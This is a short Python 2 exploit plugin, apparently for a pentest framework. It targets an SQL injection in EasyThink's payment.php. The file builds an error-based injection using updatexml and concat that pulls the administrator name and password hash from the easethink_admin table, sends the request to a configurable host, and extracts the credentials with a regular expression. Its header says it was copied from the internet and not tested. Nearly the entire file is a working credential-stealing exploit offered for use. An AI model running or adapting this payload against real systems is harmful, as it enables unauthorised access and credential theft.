
'''
VUL FROM INTERNEL---NOT TEST IT :(
'''
class mstplugin:
    infos = [
        ['NAME','easethink_SQLInject(payment.php)'],
        ['AUTHOR','mst'],
        ['TIME','20131024'],
        ['WEB','http://mstoor.duapp.com']
        ]
    opts  = [
        ['URL','localhost','REMOTE URL'],
        ['PORT','80','REMOTE URL-PORT'],
        ['PATH','/','REMOTE APP-PATH'],
        ['PAYLOAD','false','NEED NOT PAYLOAD']
        ]
    def exploit(self):
        if PORT == "443":
            url  =  "https://%s%s"%(URL,PATH)
        else:
            url  =  "http://%s:%s%s"%(URL,PORT,PATH)
        poc = "payment.php?act=return&class_name=-1' and (updatexml(1,concat(0x7c,(select concat(adm_name,0x3a,adm_password) from easethink_admin limit 1)),1))--"
        exp = url+poc
        try:
            tmp = fuck.urlget(exp).read()
            res = fuck.find(r'\:\w+[|]{1}\w+',tmp)
            print res
        except Exception,e:
            print e
        